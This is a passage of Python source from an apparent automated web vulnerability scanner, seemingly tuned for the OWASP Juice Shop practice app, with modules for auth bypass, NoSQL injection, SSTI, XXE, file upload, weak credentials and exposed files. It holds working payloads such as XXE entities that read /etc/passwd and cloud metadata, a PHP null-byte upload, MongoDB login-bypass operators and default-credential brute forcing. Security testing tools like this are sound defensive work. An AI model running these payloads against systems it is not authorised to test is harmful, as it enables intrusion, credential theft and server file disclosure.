                sev = "critical" if any(kw in body for kw in
                                         ["password", "secret", "api_key", "private_key",
                                          "token", "aws_access", "DB_PASSWORD", "APP_KEY"]) else "high"
                yield _finding("auth_bypass", "sensitive_file_exposure", sev,
                    f"Sensitive File Exposed: {path}",
                    f"File {path} is publicly accessible (HTTP 200) and contains "
                    f"{'credentials or secrets' if sev == 'critical' else 'potentially sensitive configuration'}.",
                    f"URL: {url}\nContent-Type: {ct}\nSize: {len(body)} bytes\nSnippet: {body[:300]}",
                    url, True,
                    f"Block access to {path} in your web server configuration. "
                    f"Remove sensitive files from the webroot.",
                    confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── Monitoring / metrics endpoint exposure ────────────────────────────────
    # Prometheus /metrics, Spring actuator, debug endpoints — expose server
    # internals including CPU, memory, request rates, environment variables.
    for path, indicators in MONITORING_PATHS:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200:
                body = r.text
                matched = [ind for ind in indicators if ind.lower() in body.lower()]
                if matched:
                    sev = "critical" if "env" in path or "password" in body.lower() else "high"
                    yield _finding("auth_bypass", "monitoring_endpoint_exposed", sev,
                        f"Monitoring/Metrics Endpoint Publicly Accessible: {path}",
                        f"Endpoint {path} is publicly accessible and returns server metrics "
                        f"or configuration data. Indicators found: {matched}. "
                        f"Exposes server internals to unauthenticated users.",
                        f"URL: {url}\nIndicators matched: {matched}\nSnippet: {body[:400]}",
                        url, True,
                        f"Restrict {path} to internal networks or authenticated admin users. "
                        f"Add firewall rules to block public access to monitoring endpoints.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── FTP/file directory listing ────────────────────────────────────────────
    ftp_like_paths = ["/ftp", "/files", "/uploads", "/backup", "/static/files"]
    for path in ftp_like_paths:
        url = target + path
        try:
            r = await client.get(url, timeout=6)
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            body = r.text
            ct = r.headers.get("content-type", "")
            if r.status_code == 200:
                # Look for directory listing indicators
                if any(ind in body for ind in ["Index of /", "Directory listing", "<a href=\".."]):
                    yield _finding("auth_bypass", "directory_listing", "high",
                        f"Directory Listing Enabled: {path}",
                        f"Path {path} shows a directory listing, exposing all files.",
                        f"URL: {url}\nSnippet: {body[:300]}",
                        url, True,
                        "Disable directory listing in web server config. Add index.html to all directories.",
                        confidence="high")
                # Look for downloadable sensitive file links
                elif any(ext in body.lower() for ext in [".md\"", ".pdf\"", ".sql\"", ".bak\"", ".zip\""]):
                    yield _finding("auth_bypass", "file_download_exposure", "high",
                        f"Sensitive File Links Accessible: {path}",
                        f"Path {path} contains links to potentially sensitive files.",
                        f"URL: {url}\nSnippet: {body[:300]}",
                        url, True,
                        "Restrict access to file directories. Move sensitive files outside webroot.",
                        confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── X-Forwarded-For bypass ────────────────────────────────────────────────
    for path in ["/admin", "/api/admin", "/admin/users"]:
        url = target + path
        try:
            yield _probe("auth_bypass", "GET", url, note="no X-Forwarded-For (baseline)")
            r_plain = await client.get(url, timeout=6)
            yield _probe("auth_bypass", "GET", url, status=r_plain.status_code, size=len(r_plain.content))
            yield _probe("auth_bypass", "GET", url, payload="X-Forwarded-For: 127.0.0.1",
                         note="with X-Forwarded-For bypass header")
            r_xff = await client.get(url, headers={"X-Forwarded-For": "127.0.0.1"}, timeout=6)
            yield _probe("auth_bypass", "GET", url, status=r_xff.status_code, size=len(r_xff.content),
                         note="bypass worked!" if r_plain.status_code in (401, 403) and r_xff.status_code == 200 else "no bypass")
            if (not _is_spa_fallback(r_plain, spa_fallback_size) and
                    not _is_spa_fallback(r_xff, spa_fallback_size)):
                if r_plain.status_code in (401, 403) and r_xff.status_code == 200:
                    yield _finding("auth_bypass", "xff_bypass", "high",
                        f"Auth Bypass via X-Forwarded-For on {path}",
                        f"X-Forwarded-For: 127.0.0.1 header grants access to {path} "
                        f"that is otherwise blocked.",
                        f"Without header: {r_plain.status_code}, With header: {r_xff.status_code}",
                        url, True,
                        "Never use X-Forwarded-For for access control. "
                        "Use authentication tokens and server-side session validation.",
                        confidence="high")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # ── X-Original-URL / X-Rewrite-URL bypass ────────────────────────────────
    # Some reverse proxies (nginx, Apache) route requests based on
    # X-Original-URL/X-Rewrite-URL before auth middleware runs.
    for bypass_header in ["X-Original-URL", "X-Rewrite-URL", "X-Custom-IP-Authorization"]:
        for path in ["/admin", "/api/admin", "/admin/users"]:
            url = target + "/"  # request goes to / but header routes to /admin
            try:
                r_plain = await client.get(target + path, timeout=5)
                if r_plain.status_code not in (403, 401):
                    continue
                yield _probe("auth_bypass", "GET", url, payload=f"{bypass_header}: {path}",
                             note=f"header routing bypass — direct path returned {r_plain.status_code}")
                r_bypass = await client.get(url, headers={bypass_header: path}, timeout=6)
                yield _probe("auth_bypass", "GET", url, status=r_bypass.status_code, size=len(r_bypass.content),
                             note="bypass confirmed!" if r_bypass.status_code == 200 else "not bypassed")
                if r_bypass.status_code == 200 and not _is_spa_fallback(r_bypass, spa_fallback_size):
                    body = r_bypass.text.lower()
                    if any(ind in body for ind in ["admin", "users", "dashboard", "management"]):
                        yield _finding("auth_bypass", f"header_bypass_{bypass_header.lower().replace('-', '_')}", "high",
                            f"Auth Bypass via {bypass_header} Header",
                            f"Direct request to {path} returns {r_plain.status_code}, but "
                            f"requesting / with `{bypass_header}: {path}` returns 200 with admin content.",
                            f"URL: {target}/\n{bypass_header}: {path}\nStatus: 200",
                            url, True,
                            f"Strip {bypass_header} headers at the edge before routing to application servers. "
                            f"Do not use URL headers for access control decisions.",
                            confidence="medium")
                        break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # ── Path traversal / case variation bypass ────────────────────────────────
    path_variations = [
        ("/ADMIN", "uppercase"),
        ("/admin/", "trailing slash"),
        ("/admin/..", "dot-dot"),
        ("/%61dmin", "URL encoded 'a'"),
        ("/admin%20", "URL encoded space"),
        ("/;/admin", "semicolon bypass"),
        ("//admin", "double slash"),
    ]
    for variation, technique in path_variations:
        url = target + variation
        try:
            r_plain = await client.get(target + "/admin", timeout=5)
            if r_plain.status_code not in (401, 403):
                continue
            r_var = await client.get(url, timeout=6)
            if (r_var.status_code == 200 and
                    not _is_spa_fallback(r_var, spa_fallback_size) and
                    len(r_var.text) > 100):
                body_lower = r_var.text.lower()
                if any(ind in body_lower for ind in ["admin", "dashboard", "users", "management"]):
                    yield _finding("auth_bypass", f"path_bypass_{technique.replace(' ', '_')}", "high",
                        f"Admin Path Auth Bypass via {technique}",
                        f"/admin returns {r_plain.status_code}, but `{variation}` ({technique}) "
                        f"returns 200 with admin content — path normalization bypass.",
                        f"Blocked: {target}/admin → {r_plain.status_code}\n"
                        f"Bypassed: {url} → {r_var.status_code}",
                        url, True,
                        "Normalize URL paths before applying access controls. "
                        "Apply auth middleware after path normalization, not before.",
                        confidence="medium")
                    break
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)


# ── Module: Takeover Detection ────────────────────────────────────────────────

async def _module_takeover(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    fingerprints = [
        ("There isn't a GitHub Pages site here", "GitHub Pages", "critical"),
        ("NoSuchBucket", "AWS S3", "critical"),
        ("The specified bucket does not exist", "AWS S3", "critical"),
        ("No Such Account", "Heroku", "critical"),
        ("Repository not found", "GitHub/Bitbucket", "critical"),
        ("This page is in Maintenance Mode", "Webflow", "high"),
        ("Fastly error: unknown domain", "Fastly CDN", "high"),
        ("The request could not be satisfied", "CloudFront", "high"),
        ("Domain not configured", "Netlify", "high"),
        ("Unrecognized domain", "Surge.sh", "high"),
        ("project not found", "Firebase/Vercel", "high"),
        ("There is no app configured at that hostname", "Heroku", "critical"),
    ]
    try:
        r = await client.get(target, timeout=10)
        body_lower = r.text.lower()
        server = r.headers.get("server", "").lower()
        for fp, service, severity in fingerprints:
            if fp.lower() in body_lower or fp.lower() in server:
                yield _finding("takeover", "service_takeover", severity,
                    f"Potential {service} Subdomain/Service Takeover",
                    f"Response contains `{fp}` — indicates an unclaimed {service} resource. "
                    f"Attacker can claim this service and host malicious content on this domain.",
                    f"Fingerprint: {fp}\nStatus: {r.status_code}",
                    target, True,
                    f"Claim or decommission the unclaimed {service} resource. "
                    f"Remove CNAME records pointing to unclaimed services.",
                    confidence="high")
                return
    except httpx.HTTPError:
        pass


# ── Module: NoSQL Injection ───────────────────────────────────────────────────

async def _module_nosql(target: str, client: httpx.AsyncClient,
                        forms: list[dict]) -> AsyncGenerator[dict, None]:
    """Test for NoSQL injection via MongoDB operator injection."""

    # Test REST endpoints with operator injection in URL params
    for path, param in NOSQL_REST_ENDPOINTS:
        url = target + path
        for payload in NOSQL_URL_PAYLOADS[:3]:
            try:
                r = await client.get(f"{url}?{param}{payload}", timeout=8)
                if r.status_code == 200 and len(r.content) > 100:
                    try:
                        data = r.json()
                        # If we get a list of items back with operator injection, likely NoSQL injection
                        items = data if isinstance(data, list) else data.get("data", [])
                        if isinstance(items, list) and len(items) > 0:
                            yield _finding("nosql", "nosql_url_operator", "high",
                                f"NoSQL Injection via URL Parameter: {path}",
                                f"MongoDB operator `{payload}` in `{param}` returned {len(items)} records. "
                                f"Operator injection may allow unauthorized data access or auth bypass.",
                                f"URL: {url}?{param}{payload}\nRecords returned: {len(items)}\nSample: {str(items[0])[:200]}",
                                url, True,
                                "Validate and sanitize all inputs. Use allowlists for query params. "
                                "Disable MongoDB operator injection with schema validation.",
                                confidence="medium")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test REST login endpoints with JSON operator injection
    rest_login_paths = [
        "/rest/user/login", "/api/auth/login", "/api/login",
        "/api/v1/auth/login", "/auth/login",
    ]
    for path in rest_login_paths[:4]:
        url = target + path
        for op_payload in [{"$gt": ""}, {"$ne": None}, {"$regex": ".*"}]:
            try:
                payload = {"email": op_payload, "password": op_payload}
                r = await client.post(url, json=payload, timeout=8)
                if r.status_code in (200, 201):
                    try:
                        data = r.json()
                        if any(k in str(data) for k in ["token", "access_token", "authentication", "user"]):
                            yield _finding("nosql", "nosql_login_bypass", "critical",
                                "NoSQL Injection Auth Bypass via REST Login",
                                f"MongoDB operator `{op_payload}` in login payload bypassed authentication — "
                                f"a token was returned without valid credentials.",
                                f"URL: {url}\nPayload: {payload}\nResponse keys: {list(data.keys())[:5]}",
                                url, True,
                                "Use MongoDB schema validation to reject operator objects in string fields. "
                                "Never pass raw request body objects directly to database queries.",
                                confidence="high")
                            break
                    except Exception:
                        pass
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test for NoSQL injection in form POST endpoints
    for form in forms[:3]:
        if form.get("method") != "POST":
            continue
        inputs = form.get("inputs", [])
        user_fields = [i for i in inputs if any(k in i.lower() for k in ["user", "email", "login"])]
        if not user_fields:
            continue
        # Try sending operator as value — some frameworks parse [$gt]= in forms
        for field in user_fields[:1]:
            try:
                form_data = {inp: "[$ne]=invalid" if inp == field else "test" for inp in inputs}
                r = await client.post(form["action"], data=form_data, timeout=8)
                if r.status_code == 200 and len(r.content) > 100:
                    yield _finding("nosql", "nosql_form_injection", "medium",
                        "Potential NoSQL Injection via Form Parameter",
                        f"Form at {form['action']} may accept MongoDB operators via `{field}` field.",
                        f"Form: {form['action']}\nField: {field}\nStatus: {r.status_code}",
                        form["action"], False,
                        "Validate all form inputs server-side. Reject operator-like strings in string fields.",
                        confidence="low")
            except httpx.HTTPError:
                pass
        await asyncio.sleep(0)


# ── Module: SSTI ─────────────────────────────────────────────────────────────

async def _module_ssti(target: str, client: httpx.AsyncClient,
                       forms: list[dict]) -> AsyncGenerator[dict, None]:
    """
    SSTI detection with high-specificity math canaries to eliminate false positives.
    Uses large unique products that are very unlikely to appear in normal responses:
    - {{7777*7777}} → 60481729 (Jinja2, Twig, Flask)
    - {{7777*'7'}} → 7777777777 (Jinja2 string multiplication)
    - <%= 7777*7777 %> → 60481729 (ERB/Ruby)
    - ${7777*7777} → 60481729 (FreeMarker/OGNL)
    Also verifies result is NOT in the baseline response (rules out pre-existing content).
    """
    # High-specificity SSTI probes: (payload, expected_result, engine_name)
    _SSTI_PROBES = [
        ("{{7777*7777}}", "60481729", "Jinja2/Twig"),
        ("{{7777*'7'}}", "7777777777", "Jinja2 (string mul)"),
        ("<%= 7777*7777 %>", "60481729", "ERB/Ruby"),
        ("${7777*7777}", "60481729", "FreeMarker/OGNL"),
        ("#{7777*7777}", "60481729", "Pebble/Thymeleaf"),
        ("*{7777*7777}", "60481729", "Spring/Thymeleaf"),
        ("{{=7777*7777}}", "60481729", "Slim/Haml"),
    ]

    # Establish baseline for each param (to filter pre-existing content)
    baseline_body = ""
    try:
        bl_r = await client.get(target, timeout=8)
        baseline_body = bl_r.text
    except Exception:
        pass

    ssti_params = ["name", "q", "search", "message", "template", "subject", "input", "content", "text"]

    for param in ssti_params[:5]:
        for payload, expected, engine in _SSTI_PROBES:
            if expected in baseline_body:
                continue  # Result appears in baseline — skip to avoid FP
            try:
                import urllib.parse
                encoded_payload = urllib.parse.quote(payload)
                r = await client.get(f"{target}?{param}={encoded_payload}", timeout=8)
                if expected in r.text and expected not in baseline_body:
                    yield _finding("ssti", "ssti_url_param", "critical",
                        f"Server-Side Template Injection via '{param}' — {engine}",
                        f"Payload `{payload}` evaluated to `{expected}` in response. "
                        f"The server is executing template expressions from user input. "
                        f"This is a Remote Code Execution vector — attacker can run arbitrary code.",
                        f"URL: {target}?{param}={payload}\n"
                        f"Expected result: {expected}\nEngine: {engine}\n"
                        f"Context: ...{r.text[max(0,r.text.find(expected)-30):r.text.find(expected)+50]}...",
                        target, True,
                        "Never pass user-supplied data to template rendering functions. "
                        "Use sandboxed template environments. Treat all user input as literals.",
                        confidence="high")
                    return
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test POST forms
    for form in forms[:4]:
        inputs = form.get("inputs", [])
        action = form.get("action", "")
        if not action:
            continue
        # Get form baseline
        form_baseline = ""
        try:
            safe_data = {inp: "hello" for inp in inputs}
            bl_form_r = await client.post(action, data=safe_data, timeout=8)
            form_baseline = bl_form_r.text
        except Exception:
            pass

        for field in SSTI_TEST_FIELDS:
            if field not in inputs:
                continue
            for payload, expected, engine in _SSTI_PROBES[:4]:
                if expected in form_baseline:
                    continue
                try:
                    form_data = {inp: payload if inp == field else "hello" for inp in inputs}
                    r = await client.post(action, data=form_data, timeout=8)
                    if expected in r.text and expected not in form_baseline:
                        yield _finding("ssti", "ssti_form_field", "critical",
                            f"SSTI in Form Field '{field}' at {action} — {engine}",
                            f"Payload `{payload}` evaluated to `{expected}` in POST response. "
                            f"The server evaluates template expressions from form input — RCE risk.",
                            f"Form: {action}\nField: {field}\nPayload: {payload}\n"
                            f"Result: {expected} found in response",
                            action, True,
                            "Never render user input via template engines. "
                            "Use SandboxedEnvironment (Jinja2) or equivalent.",
                            confidence="high")
                        return
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(0)


# ── Module: XXE ───────────────────────────────────────────────────────────────

async def _module_xxe(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test XML External Entity injection on XML-accepting endpoints."""

    xml_endpoints = [
        "/b2b/v2/orders",
        "/api/xml",
        "/api/v1/xml",
        "/import",
        "/api/import",
        "/upload",
    ]

    order_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<orders>
  <order>
    <quantity>1</quantity>
    <item>&xxe;</item>
    <address>test</address>
  </order>
</orders>"""

    xxe_ssrf_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<order><quantity>&xxe;</quantity></order>"""

    for path in xml_endpoints:
        url = target + path
        for payload, name in [
            (order_xxe_payload, "file_read"),
            (xxe_ssrf_payload, "ssrf"),
        ]:
            try:
                r = await client.post(url,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                    timeout=10)
                body = r.text
                # Check for file read
                if any(ind in body for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
                    yield _finding("xxe", "xxe_file_read", "critical",
                        f"XXE — Local File Read via {path}",
                        f"XML External Entity payload read /etc/passwd contents. "
                        f"Full server filesystem access is possible.",
                        f"Endpoint: {url}\nEvidence: /etc/passwd content in response\n"
                        f"Snippet: {body[:300]}",
                        url, True,
                        "Disable external entity processing in XML parsers. "
                        "Use XMLConstants.FEATURE_SECURE_PROCESSING in Java. "
                        "Set libxml_disable_entity_loader(true) in PHP.",
                        confidence="high")
                    break
                # Check for SSRF via XXE
                if any(ind in body for ind in ["ami-id", "instance-id", "computeMetadata"]):
                    yield _finding("xxe", "xxe_ssrf", "critical",
                        f"XXE SSRF — Cloud Metadata Access via {path}",
                        f"XXE payload triggered SSRF to cloud metadata service.",
                        f"Endpoint: {url}\nEvidence: cloud metadata in response",
                        url, True,
                        "Disable external entities. Block access to internal metadata endpoints.",
                        confidence="high")
                # Check for XML parsing error (server accepts XML)
                if r.status_code != 404 and any(ind in body.lower() for ind in
                        ["xml", "entity", "parsing", "malformed", "syntax error"]):
                    yield _finding("xxe", "xxe_parser_exposed", "medium",
                        f"XML Parser Exposed at {path}",
                        f"Endpoint accepts XML input — may be vulnerable to XXE. "
                        f"XML parsing errors detected in response.",
                        f"Endpoint: {url}\nStatus: {r.status_code}\nResponse: {body[:200]}",
                        url, True,
                        "Configure XML parser to disallow DOCTYPE declarations and external entities. "
                        "Validate and sanitize all XML input.",
                        confidence="low")
                    break
            except httpx.HTTPError:
                pass
            await asyncio.sleep(0)

    # Test the Juice Shop B2B endpoint specifically
    juiceshop_b2b = target + "/b2b/v2/orders"
    try:
        r = await client.post(juiceshop_b2b,
            content=order_xxe_payload.encode(),
            headers={"Content-Type": "application/xml", "X-User-Email": "admin@juice-sh.op"},
            timeout=10)
        if r.status_code not in (404, 405):
            body = r.text
            if any(ind in body for ind in XXE_INDICATORS):
                yield _finding("xxe", "xxe_b2b_confirmed", "critical",
                    "XXE Confirmed in B2B Order API",
                    f"B2B XML order endpoint parsed external entities. "
                    f"Server file contents were returned in the response.",
                    f"Endpoint: {juiceshop_b2b}\nEvidence: {body[:300]}",
                    juiceshop_b2b, True,
                    "Disable external XML entity processing on the order ingestion endpoint.",
                    confidence="high")
            elif r.status_code in (200, 201, 400):
                yield _finding("xxe", "xxe_b2b_accepts_xml", "info",
                    "B2B XML Endpoint Active — Test Manually for XXE",
                    f"POST {juiceshop_b2b} accepts XML input (status {r.status_code}). "
                    f"Manually verify XXE with DOCTYPE/entity payloads.",
                    f"Endpoint: {juiceshop_b2b}\nStatus: {r.status_code}",
                    juiceshop_b2b, False,
                    "Audit XML parsing configuration for external entity handling.",
                    confidence="low")
    except httpx.HTTPError:
        pass


# ── Module: File Upload ────────────────────────────────────────────────────────

async def _module_file_upload(target: str, client: httpx.AsyncClient,
                               spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """Test file upload endpoints for extension bypass, size limits, and XXE in SVG."""
    import io

    for path in FILE_UPLOAD_PATHS:
        url = target + path
        # First probe to check endpoint exists
        try:
            probe = await client.get(url, timeout=6)
            if _is_spa_fallback(probe, spa_fallback_size) or probe.status_code == 404:
                continue
        except httpx.HTTPError:
            pass

        # Test 1: Upload oversized file (>100 KB) — Juice Shop Upload Size challenge
        oversized_content = b"A" * 150000  # 150 KB
        try:
            files = {"file": ("test.pdf", io.BytesIO(oversized_content), "application/pdf")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201):
                yield _finding("file_upload", "upload_size_bypass", "medium",
                    f"File Upload Size Limit Not Enforced: {path}",
                    f"Uploaded a 150 KB file to {path} successfully (got {r.status_code}). "
                    f"Server does not enforce file size limits.",
                    f"Endpoint: {url}\nFile size: 150 KB\nStatus: {r.status_code}",
                    url, True,
                    "Enforce file size limits server-side. Reject files exceeding the allowed size.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Test 2: Upload non-PDF/ZIP file — Juice Shop Upload Type challenge
        try:
            files = {"file": ("test.xml", io.BytesIO(b"<test>hello</test>"), "text/xml")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201):
                yield _finding("file_upload", "upload_type_bypass", "medium",
                    f"File Type Restriction Bypassable: {path}",
                    f"Uploaded a `.xml` file (not pdf/zip) and got status {r.status_code}. "
                    f"Server does not validate file type server-side.",
                    f"Endpoint: {url}\nFile: test.xml\nStatus: {r.status_code}",
                    url, True,
                    "Validate file type by content (magic bytes), not just extension or MIME type. "
                    "Use a file type allowlist enforced server-side.",
                    confidence="medium")
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

        # Test 3: SVG XXE via file upload
        svg_xxe = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text></svg>"""
        try:
            files = {"file": ("test.svg", io.BytesIO(svg_xxe), "image/svg+xml")}
            r = await client.post(url, files=files, timeout=10)
            if any(ind in r.text for ind in ["root:", "/bin/bash", "/sbin/nologin"]):
                yield _finding("file_upload", "upload_svg_xxe", "critical",
                    f"XXE via SVG File Upload at {path}",
                    f"SVG file with XXE payload returned /etc/passwd contents. "
                    f"Full server filesystem access via file upload.",
                    f"Endpoint: {url}\nEvidence: /etc/passwd in response\nSnippet: {r.text[:200]}",
                    url, True,
                    "Sanitize SVG uploads. Disable XML external entities before processing uploads. "
                    "Use server-side SVG sanitization library.",
                    confidence="high")
        except (httpx.HTTPError, Exception):
            pass
        await asyncio.sleep(0)

        # Test 4: Null byte extension bypass
        try:
            files = {"file": ("test.php\x00.pdf", io.BytesIO(b"<?php echo 'pwned'; ?>"), "application/pdf")}
            r = await client.post(url, files=files, timeout=10)
            if r.status_code in (200, 201) and "pwned" in r.text:
                yield _finding("file_upload", "upload_null_byte_rce", "critical",
                    f"Null Byte Extension Bypass — Possible RCE at {path}",
                    f"Uploaded PHP file with null byte bypass (`test.php\\x00.pdf`) — "
                    f"server executed PHP and returned 'pwned'.",
                    f"Endpoint: {url}\nFile: test.php\\x00.pdf\nResponse: {r.text[:100]}",
                    url, True,
                    "Sanitize file names server-side. Strip null bytes before processing. "
                    "Never execute uploaded files.",
                    confidence="high")
        except (httpx.HTTPError, Exception):
            pass
        await asyncio.sleep(0)


# ── Module: Broken Authentication ─────────────────────────────────────────────

async def _module_broken_auth(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
    """Test for weak/default credentials and broken authentication mechanisms."""

    login_endpoints = [
        ("/rest/user/login", "email", "password"),
        ("/api/login", "username", "password"),
        ("/api/auth/login", "email", "password"),
        ("/api/v1/auth/login", "email", "password"),
        ("/api/users/login", "email", "password"),
        ("/login", "email", "password"),
    ]

    found_login = None

    for path, user_field, pass_field in login_endpoints[:3]:
        url = target + path
        # Quick probe
        try:
            probe = await client.post(url, json={user_field: "probe@test.com", pass_field: "wrongpassword"}, timeout=6)
            if probe.status_code == 404:
                continue
            found_login = (url, user_field, pass_field)
            break
        except httpx.HTTPError:
            continue

    if not found_login:
        return

    url, user_field, pass_field = found_login

    for username, password in WEAK_CREDENTIAL_PAIRS[:12]:
        try:
            r = await client.post(url, json={user_field: username, pass_field: password}, timeout=8)
            if r.status_code in (200, 201):
                try:
                    data = r.json()
                    if any(k in str(data) for k in ["token", "access_token", "authentication", "session"]):
                        yield _finding("broken_auth", "weak_default_credentials", "critical",
                            f"Weak/Default Credentials Accepted: {username}",
                            f"Login succeeded with `{username}` / `{password}`. "
                            f"Default or weak credentials are accepted by the application.",
                            f"Endpoint: {url}\nUsername: {username}\nPassword: {password}\n"
                            f"Response keys: {list(data.keys())[:5]}",
                            url, True,
                            "Enforce strong password policy. Rotate all default credentials. "
                            "Implement account lockout after failed attempts.",
                            confidence="high")
                        break  # found one set, move on
                except Exception:
                    pass
        except httpx.HTTPError:
            pass
        await asyncio.sleep(0)

    # Test for missing account lockout (brute-force protection)
    failed_count = 0
    test_user = WEAK_CREDENTIAL_PAIRS[0][0]
    for i in range(5):
        try:
            r = await client.post(url, json={user_field: test_user, pass_field: f"wrongpass{i}"}, timeout=6)
            if r.status_code not in (429, 423, 403):
                failed_count += 1
        except httpx.HTTPError:
            break
        await asyncio.sleep(0.1)

    if failed_count >= 5:
        yield _finding("broken_auth", "no_lockout", "medium",
            "No Account Lockout / Rate Limiting Detected",
            f"Sent 5 consecutive failed login attempts to {url} without triggering "
            f"lockout (429) or account lock (423). Brute-force attacks are possible.",
            f"Endpoint: {url}\n5 failed attempts all returned non-429/423 responses",
            url, True,
            "Implement account lockout or exponential backoff after N failed attempts. "
            "Use CAPTCHA for login endpoints. Consider IP-based rate limiting.",
            confidence="medium")

    # Test password reset — verify link expiry
    reset_paths = ["/forgot-password", "/api/forgot-password", "/rest/user/reset-password"]
    for path in reset_paths[:2]:
        reset_url = target + path
        try:
            r = await client.post(reset_url, json={"email": test_user}, timeout=6)
            if r.status_code in (200, 201, 204):
                yield _finding("broken_auth", "password_reset_active", "info",
                    f"Password Reset Endpoint Active: {path}",
                    f"POST {reset_url} returned {r.status_code} — password reset mechanism is active. "
                    f"Verify reset tokens expire, are single-use, and reset emails go to correct address only.",
                    f"Endpoint: {reset_url}\nStatus: {r.status_code}",
                    reset_url, False,
                    "Ensure reset tokens: (1) expire within 15 minutes, (2) are invalidated after use, "
                    "(3) are cryptographically random, (4) sent only to the registered email.",
                    confidence="low")
                break
        except httpx.HTTPError:
            pass


# ── Module: Information Disclosure ───────────────────────────────────────────

async def _module_info_disclosure(target: str, client: httpx.AsyncClient,
                                   spa_fallback_size: int = 0) -> AsyncGenerator[dict, None]:
    """Probe for exposed sensitive files: FTP dir, backups, .env, git, logs."""

    for path in INFO_DISCLOSURE_PATHS:
        url = target + path
        yield _probe("info_disclosure", "GET", url, note=f"probing sensitive path: {path}")
        try:
            r = await client.get(url, timeout=8)
            yield _probe("info_disclosure", "GET", url, status=r.status_code, size=len(r.content),
                         note="exposed!" if r.status_code == 200 and len(r.content) > 20 else "not found")
            if _is_spa_fallback(r, spa_fallback_size):
                continue
            if r.status_code == 200 and len(r.content) > 20:
                body = r.text
                body_lower = body.lower()

                # Check for FTP directory listing
                if path in ("/ftp", "/ftp/"):
                    if any(f in body for f in ["acquisitions", "package.json", "legal", "bak", "eastere"]):
                        yield _finding("info_disclosure", "ftp_directory_exposed", "high",
                            "FTP Directory Listing Exposed",
                            f"GET {url} returns a directory listing with sensitive files. "
                            f"Confidential documents, backups, and developer files are accessible.",
                            f"URL: {url}\nFiles visible: {body[:400]}",
                            url, True,
                            "Remove the /ftp directory from web root or restrict access. "
                            "Never store sensitive documents in publicly accessible directories.",
                            confidence="high")
                    continue

                # Check for specific sensitive file indicators
                if path.endswith(".bak") or path.endswith("~") or path.endswith(".old"):
                    yield _finding("info_disclosure", "backup_file_exposed", "high",
                        f"Backup/Source File Exposed: {path}",
                        f"Backup file at {url} is publicly accessible. May contain source code, "
                        f"credentials, or configuration secrets.",
                        f"URL: {url}\nSize: {len(r.content)} bytes\nPreview: {body[:200]}",
                        url, True,
                        "Remove backup files from the web root. Use .gitignore and deployment pipelines "
                        "to ensure backup files are never deployed.",
                        confidence="high")
                    continue

                if path == "/.env" or "/.env." in path:
                    sensitive_keys = [k for k in
                        ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "REDIS_URL",
                         "SMTP_PASSWORD", "AWS_SECRET", "STRIPE_KEY"]
                        if k in body or k.lower() in body_lower]
                    yield _finding("info_disclosure", "env_file_exposed", "critical",
                        ".env File Exposed — Credentials Leaked",
                        f"The .env file at {url} is publicly accessible. "
                        + (f"Detected sensitive keys: {sensitive_keys}." if sensitive_keys else "May contain secrets."),
                        f"URL: {url}\nSensitive keys found: {sensitive_keys}\nPreview: {body[:300]}",
                        url, True,
                        "Never commit or deploy .env files to web-accessible directories. "
                        "Use environment variables injected at runtime via secrets management.",
                        confidence="high")
                    continue

                if path in ("/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG"):
                    yield _finding("info_disclosure", "git_exposed", "high",
                        f"Git Repository Metadata Exposed: {path}",
                        f"Git file at {url} is publicly accessible. "
                        f"Full source code may be reconstructable from the .git directory.",
                        f"URL: {url}\nContent: {body[:200]}",
                        url, True,
                        "Block access to the .git directory via web server config. "
                        "Add `deny all` for /.git/ in nginx/Apache.",
                        confidence="high")
                    continue

                if path in ("/access.log", "/error.log", "/logs/access.log") or "access.log" in path:
                    if any(ind in body for ind in ["GET /", "POST /", "HTTP/1.1"]):
                        yield _finding("info_disclosure", "log_file_exposed", "high",
                            f"Server Log File Exposed: {path}",
                            f"Server access log at {url} is publicly accessible. "
                            f"Internal paths, user IPs, and request details are exposed.",
                            f"URL: {url}\nPreview: {body[:300]}",
                            url, True,
                            "Store logs outside the web root. Restrict access to log files.",
                            confidence="high")
                    continue

                if path == "/robots.txt":
                    # Robots.txt can reveal hidden paths
                    disallowed = [line.split(":", 1)[1].strip() for line in body.split("\n")
                                  if line.lower().startswith("disallow:")]
                    if disallowed:
                        yield _finding("info_disclosure", "robots_disallowed_paths", "info",
                            "robots.txt Reveals Hidden Paths",
                            f"robots.txt at {url} lists {len(disallowed)} Disallowed path(s). "
                            f"These paths are worth investigating for sensitive content.",
                            f"URL: {url}\nDisallowed paths: {disallowed[:10]}",
                            url, False,
